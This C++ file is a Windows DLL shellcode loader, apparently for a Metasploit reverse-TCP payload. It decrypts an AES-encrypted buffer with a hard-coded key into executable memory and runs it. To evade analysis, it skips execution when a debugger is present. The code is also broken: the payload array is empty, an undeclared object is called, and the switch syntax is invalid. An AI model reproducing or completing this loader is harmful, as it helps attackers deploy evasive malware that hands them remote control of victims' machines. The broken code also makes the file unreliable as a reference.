#define CBC 1
#include "aes.h"
#include <Windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#pragma comment (lib, "User32.lib")

using namespace std;

#define ENCRYPTEDBUFFERLENGTH 504
#define PAYLOADLENGTH 504
#define IV "E7a0eCX76F0YzS4j"
#define KEY "6ASMkFslyhwXehNZw048cF1Vh1ACzyyR"
#define CLASSNAME "myWindowsClass"
#define WINDOWTITLE "My Title"

unsigned char payload[] =



namespace Aes256MsfPayload {
    class Utils {
    public:
	static char IsDbgPresent() {
	    char present = 0;
	    __asm {
		mov eax, fs:[30h]
		mov al, [eax + 2h]
		mov present, al
	    }

	    #ifdef DEBUG
	    return 0;
	    #else
	    return present;
	    #endif
	}

	static DWORD WINAPI ExecuteCode(LPVOID LpPayload) {
	    void (*func)();
	    func = (void(*)()) lpPayload;
	    (void)(*func)();
	    return 0;
	}
    };

    class Rc4ReverseTcp {
    public:
	void Start() {
	    LPVOID lpPayload = VirtualAlloc(NULL, ENCRYPTEDBUFFERLENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	    if (lpPayload) {
		ZeroMemory(lpPayload, ENCRYPTEDBUFFERLENGTH);
		memcpy(lpPayload, payload, ENCRYPTEDBUFFERLENGTH);
	    }
	    else {
		OutputDebugString("Unable to allocate memory");
		return;
	    }

	    uint8_t* uPayload = (uint8_t*) lpPayload;
	    uint8_t* uIv = (uint8_t*) IV;
	    uint8_t* uKey = (uint8_t*) KEY;

	    CryptoUtils::AES256Decrypt(uPayload, uIv, uKey);
	    Utils::ExecuteCode(uPayload);
	}
    };
}

extern "C" __declspec(dllexport) void Exec() {
    if (!Aes256MsfPayload::Utils::IsDbgPresent()) {
        try {
	    p -> Start();
	    delete(p);
        }
        catch(std::exception& e) {
	    OutputDebugString("Oof");
	}
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID LpReserved) {
    switch(dwReason) {
	case DLL_PROCESS_ATTACH;
	    break;
	case DLL_THREAD_ATTACH;
	    break;
	case DLL_THREAD_DETACH;
	    break;
	case DLL_PROCESS_DETACH;
	    break;
    }
}
